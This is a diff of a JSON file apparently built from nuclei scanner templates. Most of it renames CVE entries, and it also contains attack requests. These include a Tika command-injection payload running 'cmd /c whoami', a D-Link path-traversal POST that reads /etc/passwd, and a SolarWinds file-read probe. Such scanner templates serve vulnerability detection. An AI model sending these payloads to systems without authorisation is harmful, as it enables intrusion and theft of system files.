@@ -6145,11 +6145,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Expect": "100-continue",
             "Content-type": "image/jp2",
             "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "X-Tika-OCRLanguage": "//E:Jscript",
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -9172,7 +9172,8 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/web.config.i18n.ashx?l=nuclei&v=nuclei"
+            "{{BaseURL}}/web.config.i18n.ashx?l=nuclei&v=nuclei",
+            "{{BaseURL}}/SWNetPerfMon.db.i18n.ashx?l=nuclei&v=nuclei"
           ]
         }
       ]
@@ -10278,7 +10279,7 @@
     {
       "id": "CVE-2020-21224",
       "info": {
-        "name": "Inspur ClusterEngine V4.0 RCE",
+        "name": "Inspur ClusterEngine V4.0 Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -10388,7 +10389,7 @@
     {
       "id": "CVE-2020-24148",
       "info": {
-        "name": "Import XML & RSS Feeds Wordpress Plugin <= 2.0.1 SSRF",
+        "name": "Import XML & RSS Feeds WordPress Plugin <= 2.0.1 Server-Side Request Forgery",
         "severity": "critical"
       },
       "requests": [
@@ -10404,7 +10405,7 @@
     {
       "id": "CVE-2020-24186",
       "info": {
-        "name": "Unauthenticated File upload wpDiscuz WordPress plugin RCE",
+        "name": "Unauthenticated File upload wpDiscuz WordPress plugin Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -10449,7 +10450,7 @@
     {
       "id": "CVE-2020-24391",
       "info": {
-        "name": "Mongo Express Remote Code Execution",
+        "name": "Mongo-Express Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -10510,7 +10511,7 @@
     {
       "id": "CVE-2020-24589",
       "info": {
-        "name": "WSO2 API Manager Blind XXE",
+        "name": "WSO2 API Manager Blind XML External Entity Injection",
         "severity": "critical"
       },
       "requests": [
@@ -10575,7 +10576,7 @@
     {
       "id": "CVE-2020-25213",
       "info": {
-        "name": "WP File Manager RCE",
+        "name": "WordPress File Manager Plugin Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -10589,7 +10590,7 @@
     {
       "id": "CVE-2020-25223",
       "info": {
-        "name": "Sophos UTM - Preauth RCE",
+        "name": "Sophos UTM Preauth Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -10618,7 +10619,7 @@
     {
       "id": "CVE-2020-25506",
       "info": {
-        "name": "D-Link DNS-320 - Unauthenticated Remote Code Execution",
+        "name": "D-Link DNS-320 Unauthenticated Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -10633,7 +10634,7 @@
     {
       "id": "CVE-2020-2551",
       "info": {
-        "name": "Unauthenticated Oracle WebLogic Server RCE",
+        "name": "Unauthenticated Oracle WebLogic Server Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -10772,7 +10773,7 @@
     {
       "id": "CVE-2020-26948",
       "info": {
-        "name": "Emby Server SSRF",
+        "name": "Emby Server Server-Side Request Forgery",
         "severity": "critical"
       },
       "requests": [
@@ -14990,7 +14991,7 @@
     {
       "id": "CVE-2021-38647",
       "info": {
-        "name": "OMIGOD - Open Management Infrastructure RCE",
+        "name": "Microsoft Open Management Infrastructure Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -15004,7 +15005,7 @@
     {
       "id": "CVE-2021-38702",
       "info": {
-        "name": "Cyberoam NetGenie XSS",
+        "name": "Cyberoam NetGenie Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15019,7 +15020,7 @@
     {
       "id": "CVE-2021-38704",
       "info": {
-        "name": "ClinicCases 7.3.3 Reflected Cross-Site Scripting (XSS)",
+        "name": "ClinicCases 7.3.3 Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15536,7 +15537,7 @@
     {
       "id": "CVE-2021-41691",
       "info": {
-        "name": "OpenSIS Student Information System 8.0 - Authenticated SQL Injection",
+        "name": "openSIS Student Information System 8.0 SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -15918,7 +15919,7 @@
     {
       "id": "CVE-2021-44529",
       "info": {
-        "name": "Ivanti EPM Cloud Services Appliance code injection",
+        "name": "Ivanti EPM Cloud Services Appliance Code Injection",
         "severity": "critical"
       },
       "requests": [
@@ -16019,8 +16020,8 @@
     {
       "id": "CVE-2021-45967",
       "info": {
-        "name": "Pascom CPS SSRF",
-        "severity": "critical"
+        "name": "Pascom CPS Server-Side Request Forgery",
+        "severity": "high"
       },
       "requests": [
         {
@@ -16064,6 +16065,22 @@
       ]
     },
     {
+      "id": "CVE-2021-46381",
+      "info": {
+        "name": "D-Link DAP-1620 - Local File Inclusion",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "body": "action=do_graph_auth&graph_code=94102&html_response_message=just_login&html_response_page=../../../../../../../../../../../../../../etc/passwd&log_pass=DummyPass&login_n=admin&login_name=DummyName&tkn=634855349&tmp_log_pass=DummyPass&tmp_log_pass_auth=DummyPass",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/apply.cgi"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0148",
       "info": {
         "name": "All-in-one Floating Contact Form < 2.0.4 - Authenticated Reflected XSS",
@@ -16096,7 +16113,7 @@
     {
       "id": "CVE-2022-0189",
       "info": {
-        "name": "WP RSS Aggregator < 4.20 - Authenticated Reflected XSS",
+        "name": "WordPress RSS Aggregator < 4.20 - Authenticated Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
